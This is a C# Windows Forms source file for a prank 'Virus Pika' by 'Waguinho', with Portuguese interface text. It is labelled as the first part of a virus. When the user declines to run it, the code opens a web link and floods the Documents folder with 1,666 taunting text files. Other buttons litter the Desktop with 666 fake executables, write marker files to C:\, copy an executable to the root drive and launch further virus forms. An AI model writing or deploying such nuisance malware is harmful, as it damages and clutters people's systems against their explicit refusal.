using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;


// PARTE 01 do virus
namespace Virus_Pika__By_Waguinho_
{
    public partial class Tela_inicial : Form
    {
        SoundPlayer zapzap;
        public Tela_inicial()
        {
            InitializeComponent();
            zapzap = new SoundPlayer(@"C:\Program Files\temp\zapzap.wav");
            
        }

       

        private void texto_Click(object sender, EventArgs e)
        {
            
        }

        private void check_CheckedChanged(object sender, EventArgs e)
        {
           
            
            if (check.Checked)
            {
                confirma.Show();
            }

            else 
            { 
                confirma.Hide(); 
            }
        }

        private void Tela_inicial_Load(object sender, EventArgs e)
        {

            //Para a tela de introdução não ser mostrada ao reiniciar com o sistema
            

            if (File.Exists(@"C:\dis.sys") == true)
            {
                ClickTroll.Enabled = false;
            }
            
            
            if (File.Exists(@"C:\surprise.sys") == true)
            {
                
                ClickTroll.Text = "NÃO FAÇA ISSO DE NOVO!";
            }
            
        }

        private void cancelar_Click(object sender, EventArgs e)
        {
            Process.Start("https://www.youtube.com/watch?v=sJ0BH_BEVJA");
            var deskt = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            var down = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            for(int ini = 0; ini < 1666; ini++)
            {
                File.WriteAllText(down + $"\\VOCÊ RETORNARÁ!{ini}.txt", "VOCÊ RETORNARÁ! VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!\nVOCÊ RETORNARÁ! VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!\nVOCÊ RETORNARÁ! VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!\nVOCÊ RETORNARÁ! VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!\nVOCÊ RETORNARÁ! VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!\nVOCÊ RETORNARÁ! VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!\nVOCÊ RETORNARÁ! VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!\nVOCÊ RETORNARÁ! VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!\nVOCÊ RETORNARÁ! VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!\nVOCÊ RETORNARÁ! VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!\nVOCÊ RETORNARÁ! VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!\nVOCÊ RETORNARÁ! VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!\nVOCÊ RETORNARÁ! VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!");
            }
            File.WriteAllText(deskt + @"\NUNCA É UM ADEUS[BY WAGUINHO].txt", "Bom, você não quis executar o Virus Pika.exe\nFica para uma próxima então (;\n\n\n\n\n Ass: Waguinho.\n\n\n\n\n\n Só uma coisa... NÃO OLHE SUA PASTA DOCUMENTOS. obrigado (:");
            Application.Exit();
        }

        private void ClickTroll_Click(object sender, EventArgs e)
        {
            if (File.Exists(@"C:\surprise.sys") == false)
            {
                File.Create(@"C:\\surprise.sys");
                MensagemRegress Spam = new MensagemRegress();
                Spam.ShowDialog();
            }

            else
            {
                var desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

                for (int arq = 0; arq < 666; arq++)
                {
                    File.Create(desktop + $"\\VIRUS PIKA{arq}.exe");
                    texto.BackColor = Color.Yellow;
                    this.BackColor = Color.Red;
                    this.BackColor = Color.Black;
                    this.BackColor = Color.Blue;
                }
                try
                {
                    File.Delete(@"C:\surprise.sys");
                } catch (Exception ex) {}
                File.Create(@"c:\dis.sys");
                Application.Exit();

            }
        }

        private async void confirma_Click(object sender, EventArgs e)
        {
            var ultimaescolha = DialogResult;
            ultimaescolha = MessageBox.Show("Atenção! esse é um último aviso. \n\n\n  DESEJA MESMO EXECUTAR???", "ULTIMO AVISO MEU NOBRE", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
            
            if (ultimaescolha == DialogResult.No)
            {
                Process.Start("https://www.youtube.com/watch?v=sJ0BH_BEVJA");
                var deskt = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                var down = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                for (int ini = 0; ini < 1666; ini++)
                {
                    File.WriteAllText(down + $"\\VOCÊ RETORNARÁ!{ini}.txt", "VOCÊ RETORNARÁ! VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!\nVOCÊ RETORNARÁ! VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!\nVOCÊ RETORNARÁ! VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!\nVOCÊ RETORNARÁ! VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!\nVOCÊ RETORNARÁ! VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!\nVOCÊ RETORNARÁ! VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!\nVOCÊ RETORNARÁ! VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!\nVOCÊ RETORNARÁ! VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!\nVOCÊ RETORNARÁ! VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!\nVOCÊ RETORNARÁ! VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!\nVOCÊ RETORNARÁ! VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!\nVOCÊ RETORNARÁ! VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!\nVOCÊ RETORNARÁ! VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!VOCÊ RETORNARÁ! VOCÊ RETORNARÁ!");
                }
                File.WriteAllText(deskt + @"\NUNCA É UM ADEUS[BY WAGUINHO].txt", "Bom, você não quis executar o Virus Pika.exe\nFica para uma próxima então (;\n\n\n\n\n Ass: Waguinho.\n\n\n\n\n\n Só uma coisa... NÃO OLHE SUA PASTA DOCUMENTOS. obrigado (:");
                Application.Exit();
            }
            else
            {
                Tela_inicial Tela_ini = new Tela_inicial();
                var dir = @"C:\Program Files\Temp";
                File.Copy(dir + @"\pika.exe", dir + @"\lol.exe",true);
                File.Copy(dir + @"\pika.exe", @"C:\lol.exe");

                texto.Hide();
                Glitch.Show();
                cancelar.Enabled = false;
                cancelar.Text = "ralecnac";
                confirma.Enabled = false;
                confirma.Text = "TRATS";
                check.Enabled = false;
                ClickTroll.Enabled = false;
                ClickTroll.Text = "01001010010101010100101001";
                await Task.Delay(500);
                this.Hide();

                await Task.Delay(5000);

                PikaVirus02 pika01 = new PikaVirus02();
                pika01.Show();
                VirusPika03 pika03 = new VirusPika03();
                pika03.Show();
                zapzap.Play();
                await Task.Delay(500);
                MessageBox.Show("Não está acontecendo nada aqui", "Pika.exe");

                
               
            }
        }

        private void Desligar120_Tick(object sender, EventArgs e)
        {
           
        }

        private void ClickStartEfeito(object sender, MouseEventArgs e)
        {
            
        }

        private void confirma_MouseEnter(object sender, EventArgs e)
        {
           
            confirma.ForeColor = Color.Red;
            
        }

        private void confirma_MouseLeave(object sender, EventArgs e)
        {
            confirma.ForeColor = Color.Black;
        }
    }
}
